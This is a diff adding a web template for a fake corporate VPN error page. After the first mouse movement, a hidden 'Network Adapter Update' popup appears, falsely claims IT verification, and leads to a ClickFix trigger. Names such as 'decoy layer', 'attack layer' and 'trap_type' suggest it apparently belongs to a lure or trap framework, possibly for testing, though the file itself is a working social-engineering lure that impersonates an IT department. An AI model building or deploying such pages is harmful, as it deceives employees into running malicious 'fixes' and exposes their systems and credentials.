@@ -1,0 +1,254 @@
+{% extends "base_layout.html" %}
+
+{% block title %}Corporate VPN - Connection Error{% endblock %}
+
+{% block content %}
+<!-- Decoy Layer: VPN Client Interface -->
+<div id="decoy-layer" style="background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif; display: flex; justify-content: center; align-items: center; padding: 20px;">
+    
+    <div style="width: 100%; max-width: 450px;">
+        <!-- VPN Client Window -->
+        <div style="background: #1e1e2e; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.5); overflow: hidden; border: 1px solid #2d2d44;">
+            
+            <!-- Window Title Bar -->
+            <div style="background: #252536; padding: 12px 16px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #2d2d44;">
+                <div style="display: flex; align-items: center; gap: 12px;">
+                    <!-- VPN Shield Icon -->
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z" fill="#4ade80"/>
+                        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12V1z" fill="#22c55e"/>
+                    </svg>
+                    <span style="color: #e2e8f0; font-size: 14px; font-weight: 600;">SecureConnect VPN</span>
+                </div>
+                <div style="display: flex; gap: 8px;">
+                    <div style="width: 12px; height: 12px; border-radius: 50%; background: #fbbf24; cursor: pointer;"></div>
+                    <div style="width: 12px; height: 12px; border-radius: 50%; background: #22c55e; cursor: pointer;"></div>
+                    <div style="width: 12px; height: 12px; border-radius: 50%; background: #ef4444; cursor: pointer;"></div>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div style="padding: 30px;">
+                
+                <!-- Status Circle -->
+                <div style="text-align: center; margin-bottom: 30px;">
+                    <div style="width: 120px; height: 120px; margin: 0 auto; position: relative;">
+                        <!-- Outer Ring -->
+                        <svg width="120" height="120" viewBox="0 0 120 120" style="position: absolute; top: 0; left: 0;">
+                            <circle cx="60" cy="60" r="54" fill="none" stroke="#2d2d44" stroke-width="6"/>
+                            <circle cx="60" cy="60" r="54" fill="none" stroke="#ef4444" stroke-width="6" stroke-dasharray="339.292" stroke-dashoffset="84.823" transform="rotate(-90 60 60)" style="transition: stroke-dashoffset 0.5s;"/>
+                        </svg>
+                        <!-- Inner Content -->
+                        <div style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center;">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="#ef4444">
+                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
+                            </svg>
+                        </div>
+                    </div>
+                    <h2 style="color: #ef4444; font-size: 18px; font-weight: 600; margin: 20px 0 8px 0;">Connection Failed</h2>
+                    <p style="color: #94a3b8; font-size: 13px; margin: 0;">Unable to establish secure tunnel</p>
+                </div>
+
+                <!-- Connection Details -->
+                <div style="background: #252536; border-radius: 8px; padding: 16px; margin-bottom: 20px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid #2d2d44;">
+                        <span style="color: #94a3b8; font-size: 13px;">Server</span>
+                        <span style="color: #e2e8f0; font-size: 13px; font-weight: 500;">vpn.corporate-network.com</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid #2d2d44;">
+                        <span style="color: #94a3b8; font-size: 13px;">Protocol</span>
+                        <span style="color: #e2e8f0; font-size: 13px;">IKEv2/IPSec</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; padding-bottom: 12px; border-bottom: 1px solid #2d2d44;">
+                        <span style="color: #94a3b8; font-size: 13px;">Status</span>
+                        <span style="color: #ef4444; font-size: 13px; font-weight: 500; display: flex; align-items: center; gap: 6px;">
+                            <span style="width: 8px; height: 8px; background: #ef4444; border-radius: 50%; animation: pulse 1.5s infinite;"></span>
+                            Disconnected
+                        </span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span style="color: #94a3b8; font-size: 13px;">Error Code</span>
+                        <span style="color: #fbbf24; font-size: 13px; font-family: monospace;">0x800B0109</span>
+                    </div>
+                </div>
+
+                <!-- Error Message -->
+                <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 8px; padding: 14px; margin-bottom: 20px;">
+                    <div style="display: flex; align-items: flex-start; gap: 10px;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#ef4444" style="flex-shrink: 0; margin-top: 2px;">
+                            <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                        </svg>
+                        <div>
+                            <p style="margin: 0; color: #fca5a5; font-size: 13px; font-weight: 600;">Network Adapter Error</p>
+                            <p style="margin: 6px 0 0 0; color: #fca5a5; font-size: 12px; line-height: 1.5;">
+                                The TAP-Windows virtual network adapter requires an update to establish a secure connection. Your current driver version is incompatible.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Action Buttons -->
+                <div style="display: flex; flex-direction: column; gap: 10px;">
+                    <button style="background: #3b82f6; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: background 0.2s;" onmouseover="this.style.background='#2563eb'" onmouseout="this.style.background='#3b82f6'">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
+                            <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+                        </svg>
+                        Retry Connection
+                    </button>
+                    <button style="background: transparent; color: #94a3b8; border: 1px solid #2d2d44; padding: 12px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.2s;" onmouseover="this.style.borderColor='#4b5563'; this.style.color='#e2e8f0'" onmouseout="this.style.borderColor='#2d2d44'; this.style.color='#94a3b8'">
+                        View Connection Logs
+                    </button>
+                </div>
+
+                <!-- Footer Info -->
+                <div style="margin-top: 20px; text-align: center;">
+                    <p style="color: #64748b; font-size: 11px; margin: 0;">
+                        SecureConnect VPN v4.2.1 • Last connected: 2 hours ago
+                    </p>
+                </div>
+            </div>
+        </div>
+
+        <!-- System Tray Notification -->
+        <div style="margin-top: 20px; background: #252536; border-radius: 8px; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border: 1px solid #2d2d44;">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="#fbbf24">
+                <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z"/>
+            </svg>
+            <div style="flex: 1;">
+                <p style="margin: 0; color: #e2e8f0; font-size: 13px; font-weight: 500;">IT Department Notice</p>
+                <p style="margin: 4px 0 0 0; color: #94a3b8; font-size: 12px;">Network driver update required for VPN access</p>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{# Define embedded attack layer - only shown if no external trap_type is set #}
+{% block attack_layer %}
+{% if not trap_type %}
+<!-- Attack Layer: Driver Update Popup -->
+<div id="attack-layer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); backdrop-filter: blur(4px); z-index: 900; justify-content: center; align-items: center;">
+    <div style="background: linear-gradient(180deg, #1e1e2e 0%, #252536 100%); max-width: 440px; width: 90%; border-radius: 12px; box-shadow: 0 25px 60px rgba(0,0,0,0.5); overflow: hidden; border: 1px solid #2d2d44;">
+        
+        <!-- Header -->
+        <div style="background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); padding: 20px; display: flex; align-items: center; gap: 15px;">
+            <div style="background: rgba(255,255,255,0.2); padding: 12px; border-radius: 10px;">
+                <svg width="28" height="28" viewBox="0 0 24 24" fill="white">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                </svg>
+            </div>
+            <div>
+                <h2 style="margin: 0; color: white; font-size: 17px; font-weight: 600;">Network Adapter Update</h2>
+                <p style="margin: 4px 0 0 0; color: rgba(255,255,255,0.85); font-size: 13px;">TAP-Windows Driver v9.24.7</p>
+            </div>
+        </div>
+
+        <!-- Content -->
+        <div style="padding: 24px;">
+            
+            <!-- Update Info -->
+            <div style="background: #1a1a2e; border-radius: 8px; padding: 16px; margin-bottom: 20px;">
+                <div style="display: flex; align-items: center; gap: 12px; margin-bottom: 14px;">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="#3b82f6">
+                        <path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/>
+                    </svg>
+                    <div>
+                        <p style="margin: 0; color: #e2e8f0; font-size: 14px; font-weight: 600;">TAP-Windows Adapter V9</p>
+                        <p style="margin: 4px 0 0 0; color: #94a3b8; font-size: 12px;">Virtual Network Interface</p>
+                    </div>
+                </div>
+                
+                <div style="display: grid; gap: 8px; font-size: 12px;">
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: #64748b;">Current Version:</span>
+                        <span style="color: #ef4444; font-weight: 500;">9.21.2 (Outdated)</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: #64748b;">Required Version:</span>
+                        <span style="color: #22c55e; font-weight: 500;">9.24.7</span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: #64748b;">Update Size:</span>
+                        <span style="color: #e2e8f0;">2.4 MB</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Warning -->
+            <div style="background: rgba(251, 191, 36, 0.1); border: 1px solid rgba(251, 191, 36, 0.3); border-radius: 8px; padding: 14px; margin-bottom: 20px;">
+                <div style="display: flex; align-items: flex-start; gap: 10px;">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="#fbbf24" style="flex-shrink: 0; margin-top: 2px;">
+                        <path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/>
+                    </svg>
+                    <div>
+                        <p style="margin: 0; color: #fcd34d; font-size: 13px; font-weight: 600;">Action Required</p>
+                        <p style="margin: 6px 0 0 0; color: #fcd34d; font-size: 12px; line-height: 1.5; opacity: 0.9;">
+                            VPN connectivity will remain unavailable until the network adapter driver is updated. This is required by your organization's security policy.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <p style="margin: 0 0 20px 0; color: #94a3b8; font-size: 13px; line-height: 1.5;">
+                Click the button below to install the required driver update. This process will take approximately 30 seconds.
+            </p>
+
+            <button onclick="triggerClickFix()" style="width: 100%; background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 14px; font-size: 15px; font-weight: 600; cursor: pointer; border-radius: 8px; display: flex; align-items: center; justify-content: center; gap: 10px; transition: transform 0.1s, box-shadow 0.2s;" onmouseover="this.style.transform='translateY(-2px)'; this.style.boxShadow='0 6px 20px rgba(34, 197, 94, 0.4)'" onmouseout="this.style.transform='translateY(0)'; this.style.boxShadow='none'">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                    <path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/>
+                </svg>
+                Install Driver Update
+            </button>
+
+            <button style="width: 100%; background: transparent; color: #64748b; border: none; padding: 12px; font-size: 13px; cursor: pointer; margin-top: 10px;" onmouseover="this.style.color='#94a3b8'" onmouseout="this.style.color='#64748b'">
+                Remind me later
+            </button>
+        </div>
+
+        <!-- Footer -->
+        <div style="padding: 12px 24px; background: #1a1a2e; border-top: 1px solid #2d2d44;">
+            <p style="margin: 0; font-size: 11px; color: #64748b; text-align: center;">
+                Verified by IT Security • Certificate: SHA-256
+            </p>
+        </div>
+    </div>
+</div>
+{% endif %}
+{% endblock %}
+
+{% block extra_css %}
+<style>
+@keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+}
+</style>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+    let triggered = false;
+
+    function showLure() {
+        if (!triggered) {
+            triggered = true;
+            // Check for embedded attack layer first, then external trap overlays
+            const attackLayer = document.getElementById('attack-layer') ||
+                               document.getElementById('cf-overlay') ||
+                               document.getElementById('chrome-overlay') ||
+                               document.getElementById('wu-trigger-overlay') ||
+                               document.getElementById('filefix-overlay');
+            if (attackLayer) {
+                attackLayer.style.display = 'flex';
+            }
+        }
+    }
+
+    // Trigger on mouse movement (user engagement)
+    document.addEventListener('mousemove', function() {
+        if (!triggered) {
+            setTimeout(showLure, 1000);
+        }
+    }, { once: true });
+</script>
+{% endblock %}
